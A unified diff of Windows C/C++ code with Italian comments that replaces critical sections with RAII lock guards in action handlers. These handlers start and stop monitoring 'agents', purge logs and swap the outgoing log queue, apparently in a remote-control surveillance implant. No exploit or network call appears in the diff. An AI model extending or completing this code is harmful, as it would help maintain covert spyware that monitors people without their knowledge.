@@ -1,5 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
+#include <rcs/lock.h>
+#include <rcs/lock_guard.h>
 #include "common.h"
 #include "H4-DLL.h"
 #include "LOG.h"
@@ -37,7 +39,7 @@ void EventMonitorStartAll(void);
 void SM_AddExecutedProcess(DWORD);
 
 // Impedisce la concorrenza fra piu' azioni (tranne la sync, che protegge solo un pezzettino)
-CRITICAL_SECTION action_critic_sec;
+static rcs::lock_guard action_guard;
 // Per la gestione del secondo thread delle azioni (quelle istantanee)
 BOOL bInstantActionThreadSemaphore = FALSE;
 HANDLE hInstantActionThread = NULL;
@@ -60,9 +62,8 @@ BOOL WINAPI DA_LogInfo(BYTE* info)
 	WCHAR info_string[1024];
 	_snwprintf_s(info_string, 1024, _TRUNCATE, L"[User]: %s", (WCHAR*)info);
 
-	EnterCriticalSection(&action_critic_sec);
+	rcs::lock lock(action_guard);
 	SendStatusLog(info_string);
-	LeaveCriticalSection(&action_critic_sec);
 	return FALSE;
 }
 
@@ -149,16 +150,16 @@ BOOL WINAPI DA_Syncronize(BYTE* action_param)
 	// Gli agent sono costretti a chiudere tutti i file
 	// aperti prima dello scambio della coda dei log.
 	// E ad agenti stoppati sposta tutti i log nella coda da inviare...
-	EnterCriticalSection(&action_critic_sec);
-	AM_SuspendRestart(AM_SUSPEND);
-	LOG_Purge(purge_time, purge_size); // se non sono stati valorizzati dal comando la funzione non fa nulla
-	Log_SwitchQueue();
-	if (new_conf)
-		AM_SuspendRestart(AM_RESET); // Riattiva gli agenti da file di configurazione (se c'e' nuovo)
-	else
-		AM_SuspendRestart(AM_RESTART); // Rimette gli agent nella condizione che avevano alla suspend
-	LeaveCriticalSection(&action_critic_sec);
-
+	{
+		rcs::lock lock(action_guard);
+		AM_SuspendRestart(AM_SUSPEND);
+		LOG_Purge(purge_time, purge_size); // se non sono stati valorizzati dal comando la funzione non fa nulla
+		Log_SwitchQueue();
+		if (new_conf)
+			AM_SuspendRestart(AM_RESET); // Riattiva gli agenti da file di configurazione (se c'e' nuovo)
+		else
+			AM_SuspendRestart(AM_RESTART); // Rimette gli agent nella condizione che avevano alla suspend
+	}
 	// Modifica configurazione eventi/azioni
 	// se ha ricevuto nuovo file di conf
 	if (new_conf) {
@@ -194,9 +195,8 @@ BOOL WINAPI DA_StartAgent(BYTE* agent_tag)
 	if (!agent_tag)
 		return FALSE;
 
-	EnterCriticalSection(&action_critic_sec);
+	rcs::lock lock(action_guard);
 	AM_MonitorStartStop(*(DWORD*)agent_tag, TRUE);
-	LeaveCriticalSection(&action_critic_sec);
 	return FALSE;
 }
 
@@ -208,9 +208,9 @@ BOOL WINAPI DA_StopAgent(BYTE* agent_tag)
 	if (!agent_tag)
 		return FALSE;
 
-	EnterCriticalSection(&action_critic_sec);
+	rcs::lock lock(action_guard);
 	AM_MonitorStartStop(*(DWORD*)agent_tag, FALSE);
-	LeaveCriticalSection(&action_critic_sec);
+	
 	return FALSE;
 }
 
